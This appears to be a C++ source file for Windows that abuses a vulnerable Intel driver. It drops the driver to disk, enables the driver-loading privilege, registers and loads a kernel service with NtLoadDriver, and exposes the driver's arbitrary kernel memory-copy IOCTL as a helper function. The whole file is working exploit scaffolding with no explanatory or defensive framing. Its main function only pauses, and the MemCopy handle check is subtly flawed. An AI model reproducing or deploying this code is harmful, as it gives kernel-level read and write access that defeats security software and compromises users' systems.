#include <Windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <winternl.h>
#include "intel_driver.hpp"

constexpr ULONG32 ioctl1 = 0x80862007;

typedef struct _COPY_MEMORY_BUFFER_INFO
{
	uint64_t case_number;
	uint64_t reserved;
	uint64_t source;
	uint64_t destination;
	uint64_t length;
}COPY_MEMORY_BUFFER_INFO, * PCOPY_MEMORY_BUFFER_INFO;

bool loadIntelByteCode(char* byte_code_start, size_t byte_code_size) {
    std::ofstream file_binary("intel_driver.sys", std::ios::out | std::ios::binary);
    if (!file_binary) {
        return false;
    }

    file_binary.write(byte_code_start, byte_code_size);
    return true;
}
bool RtlAdjustPriv() {
	typedef NTSTATUS(*RtlAdjustPrivilege_t)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
	HMODULE hModule = GetModuleHandleA("ntdll.dll");
	if (!hModule) {
		return false;
	}

	RtlAdjustPrivilege_t RtlAdjustPrivilege = (RtlAdjustPrivilege_t)(GetProcAddress(hModule, "RtlAdjustPrivilege"));
	if (!RtlAdjustPrivilege) {
		return false;
	}
	
	BOOLEAN WasEnabled = false;
	NTSTATUS status = RtlAdjustPrivilege(10, TRUE, FALSE, &WasEnabled);
	if (!NT_SUCCESS(status)) {
		return false;
	}

	return true;
}
bool startIntelDriver() {
	wchar_t intelDriverPath[MAX_PATH];
	GetFullPathNameW(L"intel_driver.sys", MAX_PATH, intelDriverPath, nullptr);
	std::string servicePath = "SYSTEM\\CurrentControlSet\\Services\\intel_driver";
	std::wstring driverPath = std::wstring(L"\\??\\") + intelDriverPath;

	HKEY hKey;
	LSTATUS status = RegCreateKeyA(HKEY_LOCAL_MACHINE, servicePath.c_str(), &hKey);
	if (status != ERROR_SUCCESS) {
		return false;
	}

	status = RegSetKeyValueW(hKey, NULL, L"ImagePath", REG_EXPAND_SZ, driverPath.c_str(), (DWORD)(driverPath.size() * sizeof(wchar_t)));
	if (status != ERROR_SUCCESS) {
		return false;
	}

	DWORD serviceTypeKernel = 1;
	status = RegSetKeyValueA(hKey, NULL, "Type", REG_DWORD, &serviceTypeKernel, sizeof(DWORD));
	if (status != ERROR_SUCCESS) {
		return false;
	}


	typedef NTSTATUS(*NtLoadDriver_t)(PUNICODE_STRING);
	typedef NTSTATUS(*RtlInitUnicodeString_t)(PUNICODE_STRING, PCWSTR);
	HMODULE hModule = GetModuleHandleA("ntdll.dll");
	if (!hModule) {
		return false;
	}
	NtLoadDriver_t NtLoadDriver = (NtLoadDriver_t)GetProcAddress(hModule, "NtLoadDriver");
	RtlInitUnicodeString_t RtlInitUnicodeString = (RtlInitUnicodeString_t)GetProcAddress(hModule, "RtlInitUnicodeString");

	if (!NtLoadDriver || !RtlInitUnicodeString) {
		return false;
	}

	std::wstring service = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\intel_driver";
	UNICODE_STRING unicodeService;
	RtlInitUnicodeString(&unicodeService, service.c_str());

	NTSTATUS status_load = NtLoadDriver(&unicodeService);
	if (!NT_SUCCESS(status_load)) {
		std::cout << "NtLoadDriver returned: 0x" << std::hex << status_load << "\n";
		return false;
	}
	return true;
}
bool MemCopy(uintptr_t source, uintptr_t destination, uintptr_t length) {
	HANDLE hDevice = CreateFileA("\\\\.\\Nal", GENERIC_ALL, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (!hDevice) {
		return false;
	}

	COPY_MEMORY_BUFFER_INFO buffer;
	buffer.case_number = 0x33;
	buffer.destination = destination;
	buffer.source = source;
	buffer.length = length;

	DWORD bytesReturned;
	bool status = DeviceIoControl(hDevice, ioctl1, &buffer, sizeof(buffer), nullptr, 0, &bytesReturned, nullptr);
	return status;
}

int main()
{
	system("pause");
}
